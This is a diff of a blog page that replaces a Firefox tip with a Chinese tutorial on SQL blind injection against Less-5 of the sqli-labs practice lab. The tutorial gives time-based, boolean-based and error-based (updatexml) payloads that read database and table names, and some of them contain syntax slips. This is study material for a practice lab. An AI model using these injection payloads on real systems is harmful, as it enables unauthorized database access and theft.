@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
-  <title>解决firefox复制url会自动encodeurl - SuQieR&#39;s Blog</title>
+  <title>sqli-less5盲注 - SuQieR&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 
@@ -152,7 +152,7 @@
 </nav>
 
     <div class="banner intro-2" id="background" parallax=true
-         style="background: url('https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814130818.jpg') no-repeat center center;
+         style="background: url('https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815113312.jpg') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
@@ -165,8 +165,8 @@
               
   <div class="mt-3 post-meta">
     <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-    <time datetime="2020-07-31 12:12">
-      July 31, 2020 pm
+    <time datetime="2020-08-01 09:03">
+      August 1, 2020 am
     </time>
   </div>
 
@@ -176,7 +176,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      111 字
+      1.1k 字
     </span>
   
 
@@ -186,7 +186,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      1
+      17
        分钟
     </span>
   
@@ -217,23 +217,204 @@
           <div class="post-content mx-auto" id="post">
             
             <article class="markdown-body">
-              <h1 id="解决firefox-复制url-会自动encodeurl"><a href="#解决firefox-复制url-会自动encodeurl" class="headerlink" title="解决firefox 复制url 会自动encodeurl"></a>解决firefox 复制url 会自动encodeurl</h1><ul>
-<li><p>问题记录：复制url之后会默认将明文encodeurl</p>
+              <h1 id="less5-or-盲注"><a href="#less5-or-盲注" class="headerlink" title="less5 or 盲注"></a>less5 or 盲注</h1><h2 id="盲注知识点"><a href="#盲注知识点" class="headerlink" title="盲注知识点"></a>盲注知识点</h2><ul>
+<li><p>什么是盲注？盲注就是再sql注入过程中，sql语句执行后，查询的数据不能回显到前端页面，此时需要利用一些方法进行判断或尝试，这个过程称之为盲注</p>
+</li>
+<li><p>从前面的sqli手注基础中，可以得知盲注分为三类</p>
 <ul>
-<li>明文地址：<a href="http://192.168.5.135/sqli/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://192.168.5.135/sqli/Less-1/?id=-1&#39;</a> or 1=1 –+</li>
-<li>经过encodeurl后的地址：<a href="http://192.168.5.135/sqli/Less-1/?id=1%27%20!%20=" target="_blank" rel="noopener">http://192.168.5.135/sqli/Less-1/?id=1%27%20!%20=</a></li>
+<li>基于布尔的sql盲注</li>
+<li>基于时间的sql盲注</li>
+<li>基于报错的sql盲注</li>
 </ul>
 </li>
-<li><p>解决方法：</p>
+<li><p>四个常用函数</p>
 <ul>
-<li><p>firefox 地址栏输入about:config进入浏览器配置界面，接受风险并继续</p>
-<p><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814105934.png" srcset="/img/loading.gif" alt=""></p>
-</li>
-<li><p>搜索<code>browser.urlbar.decodeURLsOnCopy</code> 点右侧按钮将false 切切换为true即解决</p>
-<p><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814110048.png" srcset="/img/loading.gif" alt=""></p>
+<li><p>mid()  此函数用来截取字符串</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th align="center">解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>column_name</td>
+<td align="center">必须，要提取字符的字段</td>
+</tr>
+<tr>
+<td>start</td>
+<td align="center">必需，规定的起始位置 （起始值为1）</td>
+</tr>
+<tr>
+<td>length</td>
+<td align="center">可选，要返回的字符数，如果省略，则mid()函数返回剩余文本</td>
+</tr>
+</tbody></table>
+<pre><code class="hljs mysql">用法：
+str&#x3D;&quot;1234&quot;
+mid(str,2,1) 结果返回2
+mid((select table_name from information_schema.table where table_schema&#x3D;0xxx limit 0,1)1,1)) &gt; &quot;a&quot;
+此处的column_name参数可以为sql语句</code></pre>
+
+
+
 </li>
 </ul>
 </li>
+</ul>
+<ul>
+<li><p>substr(column_name,start,length) 这个函数同substring()函数实现的功能是一样的，均为截取字符串，参数同mid()函数，不再重复列举</p>
+<pre><code class="hljs mysql">substr(database(),1,2) &gt;&#39;a&#39; 查看数据库名的第一位
+substr((select table_name from information_schema.table where table_schema&#x3D;0xxx limit 0,1)1,1) &gt; &#39;a&#39; 
+此处的column_name参数可以为sql语句</code></pre>
+
+
+
+</li>
+</ul>
+<ul>
+<li><p>left(string,n) 得到字符串左部指定个数的字符</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>string</td>
+<td>截取的字符串</td>
+</tr>
+<tr>
+<td>n</td>
+<td>截取长度</td>
+</tr>
+</tbody></table>
+<pre><code class="hljs mysql">用法
+left(database()),2 &gt; &#39;a&#39; 查数据库名第一位
+left(database()),2 &gt; &#39;ab&#39; 查数据库名前两位
+同样的string可以为自行构造的sql语句</code></pre>
+</li>
+<li><p>udpatexml()</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th align="center">解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>XML_document</td>
+<td align="center">为xml文档对象的名称</td>
+</tr>
+<tr>
+<td>XPath_string</td>
+<td align="center">XPath格式的字符串</td>
+</tr>
+<tr>
+<td>new_value</td>
+<td align="center">string格式，替换查找到符合条件的的数据</td>
+</tr>
+</tbody></table>
+<pre><code class="hljs mysql">用法
+select name from user where id&#x3D;1 and updatexml(1,concat(&#39;~&#39;,(select database()),&#39;~&#39;),3);
+updatexml() 第二个参数需要xpath格式的字符串，concat()函数为字符串连接函数显然不符合updatexml()的第二个函数需求，所以会将执行结果以报错的形式返回，这样就可以实现报错注入了
+结果</code></pre>
+
+<p><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815102805.png" srcset="/img/loading.gif" alt=""></p>
+</li>
+</ul>
+<h2 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h2><ul>
+<li><h3 id="基于时间延迟的盲注"><a href="#基于时间延迟的盲注" class="headerlink" title="基于时间延迟的盲注"></a>基于时间延迟的盲注</h3><ul>
+<li>延迟注入，正确的会延迟执行，错误没有延迟，id值无所谓，可通过f12抓包查看延迟状况</li>
+<li>爆数据库长度payload</li>
+</ul>
+<pre><code class="hljs mysql">and if(length(database())&#x3D;8,sleep(5),1) --+  # 判断当前数据库名长度是否为八个字节，是的话延迟5秒执行</code></pre>
+
+<table>
+<thead>
+<tr>
+<th><a href="http://192.168.5.135/sqli/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://192.168.5.135/sqli/Less-5/?id=1&#39;</a> and if(length(database())=8,sleep(5),1) –+</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814175503.png" srcset="/img/loading.gif" alt=""></td>
+</tr>
+</tbody></table>
+<ul>
+<li>爆数据库名payload</li>
+</ul>
+<pre><code class="hljs mysql">and if(left(database(),1)&#x3D;&#39;s&#39;,sleep(5),1)--+ # 判断当前数据库名第一个字节是否为s，是的话延迟五秒执行
+通过不断替换&#x3D;后面的字符串，正确的字符串会延迟返回，工作量超大这里不赘述</code></pre>
+
+<table>
+<thead>
+<tr>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814181925.png" srcset="/img/loading.gif" alt=""></td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+<ul>
+<li><h3 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h3></li>
+</ul>
+<ul>
+<li><p>在布尔盲注中，正确会有回显，错误没有，以此逐字爆破</p>
+</li>
+<li><p>爆数据库名payload</p>
+<pre><code class="hljs mysql">left((select database()),1) &#x3D; &#39;s&#39; --+ # 查询当前数据库名的第一个字符是否等于s，正确则等号后的值正确的话会有回显
+left((select database()),2) &#x3D; &#39;se&#39; --+ # 在第一个字符的基础上继续爆破第二个字符
+后续的字符同上依次递增</code></pre>
+
+<table>
+<thead>
+<tr>
+<th><a href="http://192.168.5.135/sqli/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://192.168.5.135/sqli/Less-5/?id=1&#39;</a> and left((select database()),1) = ‘s’ –+</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814184105.png" srcset="/img/loading.gif" alt=""></td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+<ul>
+<li><h3 id="concat聚合函数"><a href="#concat聚合函数" class="headerlink" title="concat聚合函数"></a>concat聚合函数</h3></li>
+</ul>
+<ul>
+<li><p>使用coucat函数如果分组语句，会把查询的一部分以错误的形式显示出来</p>
+<pre><code class="hljs mysql">and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+ # 将数据库名以报错的方式回显
+and updatexml(1,concat(0x7e,(select concat(table_name) from information_schema.tables where table_schema &#x3D; database() limit%20 3,1),0x7e),1) --+ # 查询当前数据库下的表名，一次只能返回一个结果，需要多次替换limit n，1 来实现遍历表名</code></pre>
+
+<table>
+<thead>
+<tr>
+<th>192.168.5.135/sqli/Less-5/?id=1’ and updatexml(1,concat(0x7e,(select ),0x7e),1) –+</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815104502.png" srcset="/img/loading.gif" alt=""></td>
+</tr>
+<tr>
+<td><a href="http://192.168.5.135/sqli/Less-5/?id=-1&#39;" target="_blank" rel="noopener">http://192.168.5.135/sqli/Less-5/?id=-1&#39;</a> and updatexml(1,concat(0x7e,(select concat(table_name) from information_schema.tables where table_schema = database() limit%20 3,1),0x7e),1) –+</td>
+</tr>
+<tr>
+<td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815110426.png" srcset="/img/loading.gif" alt=""></td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+<ul>
+<li><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3></li>
+</ul>
+<ul>
+<li>盲注这个东西，难度相对于其他类型的注入来说挺大的，确实复杂，而且各个类型以及骚操作都很多。</li>
+<li>掌握常用的盲注函数以及能够构造简单的payload就差不多了。（主要是复杂的构造不出来……）</li>
+<li>如果能够证明有盲注的存在，那么sqlmap一把嗦不香吗</li>
 </ul>
 
             </article>
@@ -244,7 +425,7 @@
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/%E6%9D%82%E9%A1%B9/">杂项</a>
+                      <a class="hover-with-bg" href="/categories/web%E6%B8%97%E9%80%8F/">web渗透</a>
                     
                   </div>
                 
@@ -252,7 +433,7 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/firefox/">firefox</a>
+                      <a class="hover-with-bg" href="/tags/sql%E7%9B%B2%E6%B3%A8/">sql盲注</a>
                     
                   </div>
                 
@@ -265,18 +446,12 @@
                   <div class="post-prev col-6">
                     
                     
-                      <a href="/2020/08/01/sqli-less5%E7%9B%B2%E6%B3%A8/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">sqli-less5盲注</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </div>
                   <div class="post-next col-6">
                     
                     
-                      <a href="/2020/07/30/sqli_less_1-4/">
-                        <span class="hidden-mobile">sqli_less1-4</span>
+                      <a href="/2020/07/31/%E8%A7%A3%E5%86%B3firefox_%E5%A4%8D%E5%88%B6url_%E4%BC%9A%E8%87%AA%E5%8A%A8encodeurl/">
+                        <span class="hidden-mobile">解决firefox复制url会自动encodeurl</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -435,7 +610,7 @@
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "解决firefox复制url会自动encodeurl&nbsp;",
+        "sqli-less5盲注&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
